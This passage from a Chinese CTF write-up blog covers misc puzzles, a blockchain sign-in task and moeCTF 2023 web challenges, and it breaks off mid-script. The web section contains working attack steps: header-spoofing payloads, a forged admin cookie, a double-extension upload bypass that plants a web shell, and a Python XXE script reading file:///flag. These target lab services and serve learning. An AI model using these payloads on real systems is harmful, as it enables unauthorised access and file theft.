src="https://s2.loli.net/2024/03/08/kFRYJ6cGr5eZ7ax.png" alt=""></p><p>里面很多嵌套的文件夹，目录即为 flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定ZIP文件路径</span></span><br><span class="line">zip_file_path = <span class="string">&quot;C:/Users/Nanian233/Downloads/Compressed/find_me.zip&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开ZIP文件</span></span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(zip_file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_file:</span><br><span class="line">    <span class="comment"># 列出ZIP文件中的所有内容</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> zip_file.namelist():</span><br><span class="line">        <span class="comment"># 输出文件或文件夹的名称</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ZIP文件中的内容:&quot;</span>, item)</span><br></pre></td></tr></table></figure><p><strong>注意：如果先解压 zip 再去查看的话，？会被转化为_，这应该跟 win 解压的文件名会自动转化某些字符有关</strong></p><p><strong>所以这里的脚本是直接打开 zip 然后继续查看里面的内容</strong></p><p><img src="https://s2.loli.net/2024/03/08/rTQXnBE3GSmvfgA.png" alt=""></p><p>删除/ 并且逆向即可</p><p><img src="https://s2.loli.net/2024/03/08/PpJRU3KgEjqe5b2.png" alt=""></p><h3 id="WEEK2-奇怪的-screenshot"><a href="#WEEK2-奇怪的-screenshot" class="headerlink" title="[WEEK2]奇怪的 screenshot"></a><strong>[WEEK2]奇怪的 screenshot</strong></h3><p>win11 截图漏洞 <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-28303">CVE-2023-28303</a> 百家姓编码</p><p>操作参考：<a href="https://tiyjbs9b260.feishu.cn/docx/RyEodPWqmo7kLAxDUtccDSgOnyb#doxcnfoQRFOzhwc4Qo6mM3Yyejf">misc 杂刷</a> 羊城杯 2023 ez_misc</p><p>工具地址：<a href="https://github.com/frankthetank-music/Acropalypse-Multi-Tool">frankthetank-music/Acropalypse-Multi-Tool: Easily detect and restore Acropalypse vulnerable</a></p><p><img src="https://s2.loli.net/2024/03/08/3A98VbIcpaiBFCJ.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/08/3bXu7lPOm2hYN9e.png" alt=""></p><p>magnet:?xt=urn:btih:flagCVE-2023-28303-Win11-Snipping-t00l-is-n0t-Secure</p><p><strong>flag{CVE-2023-28303-Win11-Snipping-t00l-is-n0t-Secure}</strong></p><blockquote><p>以下四题是自己出的，过于简单(就只展示操作了</p></blockquote><h3 id="WEEK2-喜帖街"><a href="#WEEK2-喜帖街" class="headerlink" title="[WEEK2]喜帖街"></a><strong>[WEEK2]喜帖街</strong></h3><p>频谱图 steghide Ook</p><p><img src="https://s2.loli.net/2024/03/08/UswHTo8hBLYaVpF.png" alt=""></p><p>Steghide extract -sf</p><p>password：LeeTung</p><p><img src="https://s2.loli.net/2024/03/08/TFYwSNygoUfmOZE.png" alt=""></p><p><a href="https://www.splitbrain.org/services/ook">Brainfuck/Ook! Obfuscation/Encoding [splitbrain.org]</a></p><p><img src="https://s2.loli.net/2024/03/08/ChHByoresai6mvQ.png" alt=""></p><h3 id="WEEK2-可爱的洛琪希"><a href="#WEEK2-可爱的洛琪希" class="headerlink" title="[WEEK2]可爱的洛琪希"></a><strong>[WEEK2]可爱的洛琪希</strong></h3><p>   伪加密 base64 转 jpg exif 维吉尼亚</p><p><a href="https://blog.csdn.net/xiaozhaidada/article/details/124538768?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169711311316800225547016%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169711311316800225547016&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-124538768-null-null.142%5Ev96%5Epc_search_result_base3&amp;utm_term=%E4%BC%AA%E5%8A%A0%E5%AF%86&amp;spm=1018.2226.3001.4187">CTF——zip 伪加密_xiaozhaidada 的博客-CSDN 博客</a></p><p><img src="https://s2.loli.net/2024/03/08/kvmpGHtFQD1wPsx.png" alt=""></p><p>打开得到一大串 base64</p><p><img src="https://s2.loli.net/2024/03/08/9Jqw6tA2Eyc8UCi.png" alt=""></p><p>保存 jpg 文件，右键属性打详细信息</p><p><img src="https://s2.loli.net/2024/03/08/wnPJQFageqMZTR4.png" alt=""></p><p>736c6e6f7b52626b795f71696966686b76217d</p><p><img src="https://s2.loli.net/2024/03/08/xHYBp85rb1gKjLi.png" alt=""></p><p>010 打开底部拿到 key:nanian</p><p><img src="https://s2.loli.net/2024/03/08/gd9TZVFHMAsNBxI.png" alt=""></p><h3 id="WEEK2-图片里的秘密"><a href="#WEEK2-图片里的秘密" class="headerlink" title="[WEEK2]图片里的秘密"></a><strong>[WEEK2]图片里的秘密</strong></h3><p>图片分离 单图盲水印</p><p>binwalk 题目图片，获得一个压缩包</p><p>打开里面的图片进行盲水印提取即可</p><p><img src="https://s2.loli.net/2024/03/08/htaR5xLeYi83Cjl.png" alt=""></p><h3 id="WEEK2-表里的码"><a href="#WEEK2-表里的码" class="headerlink" title="[WEEK2]表里的码"></a><strong>[WEEK2]表里的码</strong></h3><p>excel 后缀名 粗细字体转二维码</p><p><img src="https://s2.loli.net/2024/03/08/a4VtHnBzcCXl1QE.png" alt=""></p><p>改后缀为 xlsx 打开</p><p>Ctrl+H 打开替换，把粗体换成填充黑色的格子即可</p><p><img src="https://s2.loli.net/2024/03/08/AC38MQKRGvZ4HqJ.png" alt=""></p><p>扫码得到 flag</p><h3 id="WEEK3-尓纬玛"><a href="#WEEK3-尓纬玛" class="headerlink" title="[WEEK3]尓纬玛"></a><strong>[WEEK3]尓纬玛</strong></h3><p>纠错</p><p><img src="https://s2.loli.net/2024/03/08/7XHxCUFteY85rJD.png" alt=""></p><p><a href="https://www.cnblogs.com/luogi/p/15469106.html#%E4%BA%8C%E7%BB%B4%E7%A0%81%E6%81%A2%E5%A4%8D%E6%8C%91%E6%88%98-%E4%BA%8C%E7%BB%B4%E7%A0%81%E6%81%A2%E5%A4%8D%E5%B7%A5%E5%85%B7">二维码之 QR 码生成原理与损坏修复 - luogi - 博客园</a></p><p><a href="https://merri.cx/qrazybox/">qrazybox 工具</a></p><p><img src="https://s2.loli.net/2024/03/08/3NHcXB8CqSUzJ1I.png" alt=""></p><p>相同操作：解得一半的 flag</p><p><img src="https://s2.loli.net/2024/03/08/Vt5WQ6xyuwO9FXs.png" alt=""></p><p><a href="https://ctftime.org/writeup/1648">ctftime.org</a></p><p>我们把 final data bits 里的第一行数据进行二进制解密</p><p>去掉前 4(表示模式)+8(表示长度)位和后 4+8 位得到完整 flag</p><p><img src="https://s2.loli.net/2024/03/08/loWn4mwBNjFcSEi.png" alt=""></p><p><a href="https://www.163.com/dy/article/HHKUTLTI0511FQO9.html">二维码是如何设计出来的？</a></p><p><img src="https://s2.loli.net/2024/03/08/VUQoHdEint2A8CB.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/08/GXZKmeSjWon2Tx9.png" alt=""></p><p>格式信息存储了两次，因此即使 QR 码被部分遮挡也可以读取。</p><p><img src="https://s2.loli.net/2024/03/08/9AWvsrRgliNFTKw.png" alt=""></p><p><a href="https://blog.tonycrane.cc/p/409d352d.html">「QRCode 标准阅读」#0 总章</a></p><p>**二维码结构：</p><p>功能图案（function patterns）<br>  静默区（quiet zone）：至少4个单位宽<br>  特征符（finder pattern）：7x7黑圈 5x5白圈 3x3黑块<br>  分割线（separator）：在特征符周围的一圈全白区域<br>  时序图案（timing patterns）：第7行第7列的两条黑白条纹<br>  对齐图案（alignment patterns）：版本1无，版本2-6 1个，版本7-13 6个……（附录E）</p><p>编码区域（encoding region）<br>  格式信息（format information）：左上角分割线外一圈，左下角分割线右侧，右上角分割线下侧<br>  版本信息（version information）：版本7后才有，在左下分割线上侧，右上分割线左侧<br>  数据及纠错码区域  (data  and  errorcorrectioncodewords)**</p><p><img src="https://s2.loli.net/2024/03/08/3YKzL5njxNw8od6.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> MISC </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一个ctf区块链的签到题</title>
      <link href="/posts/ca4bb937.html"/>
      <url>/posts/ca4bb937.html</url>
      
        <content type="html"><![CDATA[<p><strong>来自 SHCTF 2023 的区块链签到题</strong></p><p><strong>[WEEK2]blockchain signin</strong></p><blockquote><p>如果你是第一次做区块链，请先做好以下准备</p></blockquote><h2 id="准备部分："><a href="#准备部分：" class="headerlink" title="准备部分："></a>准备部分：</h2><p><img src="https://s2.loli.net/2024/03/08/SV5Aeb7mYZGNBh1.png" alt=""></p><blockquote><p><a href="https://0314valen.github.io/article/2023-01-07-%E8%AE%B0%E4%B8%80%E4%B8%AABlockchain%E7%AD%BE%E5%88%B0%E9%A2%98%E7%9B%AE/#Remix%E4%BA%A4%E4%BA%92">记一个 Blockchain 签到题目</a></p><p>具体参考本文，这里只做操作演示</p></blockquote><p><strong>用 metamask 开一个账户测试水龙头</strong></p><p>RPC 填题目给的，链 ID 先随便填然后会报错给正确的再填，其余随意填</p><p><img src="https://s2.loli.net/2024/03/08/4891TM6iwySrELF.png" alt=""></p><p>把账户地址给水龙头可以拿到测试币（下图所示）</p><p><img src="https://s2.loli.net/2024/03/08/DNsy1TxkGWZgoSM.png" alt=""></p><p><strong>浏览器直接连接水龙头</strong></p><p><img src="https://s2.loli.net/2024/03/08/H5lqiydx1EbfKPe.png" alt=""></p><p><a href="https://remix.ethereum.org/">https://remix.ethereum.org/</a></p><p>Remix 在线地址，我这里和 metamask 一起放在 Chrome 上</p><p><strong>Remix 和 metamask 绑定</strong></p><p><img src="https://s2.loli.net/2024/03/08/7hiBjnJDKVu1cYt.png" alt=""></p><p><strong>第四栏选择 Injected Provider - MetaMask,网页会自动弹出连接</strong></p><p><img src="https://s2.loli.net/2024/03/08/W63Kwt1C4XxlViT.png" alt=""></p><p><strong>连接即可</strong></p><h2 id="操作部分："><a href="#操作部分：" class="headerlink" title="操作部分："></a>操作部分：</h2><p>nc连地址，选1<br>得到：<br>token：v4.local.swG1Vyhm-j-8tm30R4uf2wWcEWoPl1bHhLwi-OUS6qeoNMmXxZm5c8XFTcr2ElZXtCD18iLQBeGD-XmOsQq98cLOYdTsD3WwcwxMkjKLgIDCf6TIBv2ltRbBpJgZAmzgvf_9-yGLyGHAGtmbpnfNeSnBSTjf3H5B_pcWIr3olxS3yQ.R3JlZXRlcg</p><p>账户：0xD1c924fc5D72b9c6346921f37E596cE2cB859404</p><p><img src="https://s2.loli.net/2024/03/08/TMKCa6sh8cjP5X3.png" alt=""><br>账户给水龙头拿个测试币</p><p><img src="https://s2.loli.net/2024/03/08/YPj5QGWRxc3S1qA.png" alt=""><br>再次nc，这次选择2</p><p><img src="https://s2.loli.net/2024/03/08/uZ7CDp8TseK6RLi.png" alt=""><br>拿到：<br>contract address: 0x40C6BC645879BF27b6Fb1F5EC3503Ebd935bD8FF</p><p>transaction hash: 0xfc54f73720aa6b348495a17cfff45db2794873ab8362e06f43023296fc456f39<br><br></p><p>然后再选4，拿到题目源码：</p><p><img src="https://s2.loli.net/2024/03/08/Kei4qZ6tmuzE7rS.png" alt=""><br>remix，在default_workspace 里创建一个新文件</p><p><img src="https://s2.loli.net/2024/03/08/VWTje8KXCLEqmF6.png" alt=""><br>把源码放进去并作细微修改（适应版本）</p><p><img src="https://s2.loli.net/2024/03/08/HwVUzMA4lxEK81o.png" alt=""><br>调到第三栏选好对应版本 compile一下</p><p><img src="https://s2.loli.net/2024/03/08/BHWoI5wnMN3XgxA.png" alt=""><br>把contract address放到地址那里，然后点下at Address 按钮，打开下面的窗口</p><p><img src="https://s2.loli.net/2024/03/08/TvkPCfjUne1poOc.png" alt=""><br>根据代码提示，我们发起一个问候，内容为”welC0meToSHCTF2023”<br>在setGreeting里添加并运行</p><p><img src="https://s2.loli.net/2024/03/08/zKtpkNbY5CFLgHO.png" alt=""><br>刚才得到的测试币在这里派上用场，用于缴费gas<br><img src="https://s2.loli.net/2024/03/08/IrQHRPFtenwWTGL.png" alt=""><br>然后回到nc环境，选3就可以得到flag了<br><img src="https://s2.loli.net/2024/03/08/HQzLPjZAiqVsexp.png" alt=""></p><p><strong>SHCTF{1T_Ls_a_ESS3N7Iais_8IOCkCh4IN_ChaLLEn6E_Are_you_Ready_7O_DIve_In}</strong></p>]]></content>
      
      
      <categories>
          
          <category> write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 区块链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>moeCTF 2023</title>
      <link href="/posts/moeCTF2023%5B2%5D.html"/>
      <url>/posts/moeCTF2023%5B2%5D.html</url>
      
        <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="http"><a href="#http" class="headerlink" title="http"></a>http</h3><p>http 认证绕过</p><p><img src="https://s2.loli.net/2024/03/07/YgWQ4tbinMBTz1e.png" alt=""></p><p><strong>按照要求完成五个任务即可<br>Payload:<br>GET:UwU=u<br>POST:Luv=u<br>cookie:character=admin<br>x-forwarded-for:127.0.0.1<br>User-Agent: MoeBrowser<br>除Post外其余都得在Upgrade上面</strong></p><p><img src="https://s2.loli.net/2024/03/07/1ZvxywaKkHuVYsN.png" alt=""></p><p><strong>moectf{basic_http_knowledge_I-MHSmMgztyYeW4SgAbRP4Fyu0Qx13Or}</strong></p><h3 id="web-入门指北"><a href="#web-入门指北" class="headerlink" title="web 入门指北"></a>web 入门指北</h3><p>hex base64</p><p><img src="https://s2.loli.net/2024/03/07/urbixDJzCAcHwsp.png" alt=""></p><p>先hex再base64</p><p><img src="https://s2.loli.net/2024/03/07/Jh7tRx3wzMaViYA.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/07/LQwOAH6nmtd2IMv.png" alt=""></p><p><strong>moectf{w3lCome_To_moeCTF_W2b_challengE!!}</strong></p><h3 id="彼岸的-flag"><a href="#彼岸的-flag" class="headerlink" title="彼岸的 flag"></a>彼岸的 flag</h3><p>源码泄露</p><p><img src="https://s2.loli.net/2024/03/07/pcXbdqvyxJm1g6o.png" alt=""></p><p><strong>一开始以为是啥，原来就是源码泄露<br>在管理员撤回的信息这里有flag的注释</strong></p><p><img src="https://s2.loli.net/2024/03/07/ZN1nl564W7DyfYo.png" alt=""></p><p><strong>moectf{find_comments_9qv7ywbgbwCasdsfanngjHxGfgQVUKIw}</strong></p><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>伪造 token</p><p>题目有附件</p><p><img src="https://s2.loli.net/2024/03/07/yMXczOQrwAW34Fe.png" alt=""></p><p>按照方法先注册并且登录后访问/flag<br><strong>头：POST /register </strong><br><img src="https://s2.loli.net/2024/03/07/AQR18OnWkxaYZtp.png" alt=""></p><p>显示用户已存在，我们使用自己的账号</p><p><img src="https://s2.loli.net/2024/03/07/Z9rguwGd2IqkDOp.png" alt=""></p><p>然后登录</p><p><img src="https://s2.loli.net/2024/03/07/XkoV7uz9sC3xrLS.png" alt=""></p><p>这个是 base64 加密的</p><p>解密为：{“username”: “nanian”, “password”: “123456”, “role”: “user”}</p><p>放包后手动跳转到/flag</p><p><img src="https://s2.loli.net/2024/03/07/VsnZ3g1Jr8wvte9.png" alt=""></p><p>flag{sorry_but_you_are_not_admin}</p><p>这个假 flag 提示了我们 role 可能要改成 admin（毕竟只有这个是新出来的东西）</p><p>{“username”: “nanian”, “password”: “123456”, “role”: “admin”} base64 encode</p><p><img src="https://s2.loli.net/2024/03/07/FnKAmPOaeBMcCrx.png" alt=""></p><p>放入浏览器的 cookie 的 token 里就行</p><p>再次访问/flag</p><p><img src="https://s2.loli.net/2024/03/07/qyXTsH5eRwCzaFO.png" alt=""></p><p><strong>moectf{cooKi3_is_d3licious_MA9iVff90SSJ!!M6Mrfu9ifxi9i!JGofMJ36D9cPMxro}</strong></p><h3 id="gas-gas-gas"><a href="#gas-gas-gas" class="headerlink" title="gas!gas!gas!"></a>gas!gas!gas!</h3><p>   web 脚本</p><p><img src="https://s2.loli.net/2024/03/07/jLgrm8qx5iflzAC.png" alt=""></p><p><strong>开始游戏会给出题目，然后对应题目选择正确的选项答案即可，关键在于有时间限制，所以需要编写脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">url=<span class="string">&#x27;http://localhost:11499/&#x27;</span>  <span class="comment">#URL</span></span><br><span class="line">session=requests.Session()</span><br><span class="line">fx = <span class="number">0</span></span><br><span class="line">sd = <span class="number">0</span></span><br><span class="line">data=&#123;<span class="string">&quot;driver&quot;</span>:<span class="string">&quot;aaa&quot;</span>,<span class="string">&quot;steering_control&quot;</span>:fx,<span class="string">&quot;throttle&quot;</span>:sd&#125;</span><br><span class="line">re=session.post(url=url,data=data)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;向左&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">      fx=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;向右&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">      fx=-<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;弯道直行&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">      fx=<span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;抓地力太小了&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">      sd=<span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;抓地力太大了&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">      sd=<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;保持这个速度&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">      sd=<span class="number">1</span></span><br><span class="line">    soup = BeautifulSoup(re.content, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    info_div = soup.find(<span class="string">&quot;div&quot;</span>, &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;info&quot;</span>&#125;)</span><br><span class="line">    <span class="built_in">print</span>(info_div.text)</span><br><span class="line">    data=&#123;<span class="string">&quot;driver&quot;</span>:<span class="string">&quot;aaa&quot;</span>,<span class="string">&quot;steering_control&quot;</span>:fx,<span class="string">&quot;throttle&quot;</span>:sd&#125;</span><br><span class="line">    re=session.post(url=url,data=data)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="comment">#来自紫竹编写的脚本~</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/03/07/kCNA6QDetFR57Sq.png" alt=""></p><p><strong>moectf{Beautiful_Drifting!!_nUhVFFm2dbVI7EU7NC0_F4dDz-n6jjQ7}</strong></p><h3 id="moe-图床"><a href="#moe-图床" class="headerlink" title="moe 图床"></a>moe 图床</h3><p>文件上传  双后缀绕过 源码泄露</p><p><img src="https://s2.loli.net/2024/03/07/grleyPDBakRwn2t.png" alt=""></p><p><strong>先正常上传一个文件</strong></p><p><img src="https://s2.loli.net/2024/03/07/D3Enr926qxeA4Tu.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/07/R6NvgJcDMOdPwlf.png" alt=""></p><p><strong>发现调用了 upload.php，访问一下</strong></p><p><img src="https://s2.loli.net/2024/03/07/H7CNgSXYbjEeKMv.png" alt=""></p><p><strong>源码泄露，抓住重点位置</strong></p><p><img src="https://s2.loli.net/2024/03/07/rv8I3eZ5su6Gjfb.png" alt=""></p><p>比如我上传 muma.png.php 的话</p><p>explode()：把它们分成 muma   png   php 三段</p><p>然后 count 计数为 3&gt;2 进入 if 内，然后让 segment=第二个位置也就是 png，再进第二个 if 里判断是否为 png</p><p><img src="https://s2.loli.net/2024/03/07/KwH5qfRLDdkXy13.png" alt=""></p><p><strong>还要注意文件大小和类型。</strong></p><p><img src="https://s2.loli.net/2024/03/07/gJ8shH4VfEQ1jS7.png" alt=""></p><p><strong>这里上传一个正常图片，然后改文件名和内容即可</strong></p><p><strong>蚁剑连接 key 为 1，在根目录找到 flag</strong></p><p><img src="https://s2.loli.net/2024/03/07/JxABm6nqFQTjOUP.png" alt=""></p><p><strong>moectf{hmmm_improper_filter_G_x2kN18o5IQp_fuYySgbw6IUVvvU_Sm}</strong></p><h3 id="了解你的座驾"><a href="#了解你的座驾" class="headerlink" title="了解你的座驾"></a>了解你的座驾</h3><p>xxe</p><p><img src="https://s2.loli.net/2024/03/07/4kVsdNJYDpqEKGL.png" alt=""></p><p>提示 flag 在根目录中，抓包以下</p><p><img src="https://s2.loli.net/2024/03/07/iWZ3EApPLjVfR6U.png" alt=""></p><p>xxe 还没学，关键点在下图</p><p><img src="https://s2.loli.net/2024/03/07/lOKENPSBwLJnQgj.png" alt=""></p><p>直接套 m 神脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;localhost:52776&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;multipart/form-data; boundary=---------------------------15719226131077920622631907538&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;null&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;document&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;navigate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;cross-site&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-User&#x27;</span>: <span class="string">&#x27;?1&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;&#x27;-----------------------------15719226131077920622631907538</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;xml_content&quot;</span></span><br><span class="line"><span class="string">Content-Type: text/xml</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="string">    &lt;!ENTITY b SYSTEM &quot;file:///flag&quot; &gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;xml&gt;&lt;name&gt;&amp;b;&lt;/name&gt;&lt;/xml&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----------------------------15719226131077920622631907538--</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">response = requests.post(<span class="string">&#x27;xxx网址位置xxx&#x27;</span>, headers=headers, data=data)   <span class="comment">#URL</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/03/07/RMuGlLpY38UoWNq.png" alt=""></p><p><strong>moectf{Which_one_You’ve_Chosen?0n8i1NDyjS2SD5yAUtpdBqqvH8vXFeSu}</strong></p><h3 id="大海捞针"><a href="#大海捞针" class="headerlink" title="大海捞针"></a>大海捞针</h3><p>URL 爆破</p><p><img src="https://s2.loli.net/2024/03/07/V62NBRZhjKSOnJv.png" alt=""></p><p>按照要求先进/?id=1 看看</p><p><img src="https://s2.loli.net/2024/03/07/E4K6unDiTmJRfqY.png" alt=""></p><p>跟彼岸的 flag 一样属于源码泄露，只不过这次要爆破从 1-1000 的 URL，只有一个里面有 flag</p><p><strong>BP抓包后到Intruder加变量，再加一个1-1000的字典然后爆破即可</strong></p><p><img src="https://s2.loli.net/2024/03/07/vMPq4ARL58ihUKG.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">desktop_path = <span class="string">&quot;xxx&quot;</span>  <span class="comment"># 替换为您的路径</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;<span class="subst">&#123;desktop_path&#125;</span>/number_dictionary.txt&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> number <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1001</span>):</span><br><span class="line">        file.write(<span class="built_in">str</span>(number) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#数字字典脚本</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/03/07/4ChklfrMBZ2yPdt.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/07/jbVulq2ewCL4aK7.png" alt=""></p><p><strong>找到一个不同长度的进去搜索moectf即可得到flag</strong><br><strong>还可以使用py脚本遍历网址查看html找moectf关键词然后输出其注释内容</strong></p><p><img src="https://s2.loli.net/2024/03/07/H4uvgIXMjVbomFn.png" alt=""></p><blockquote><p>来自 chatgpt 写的脚本</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> 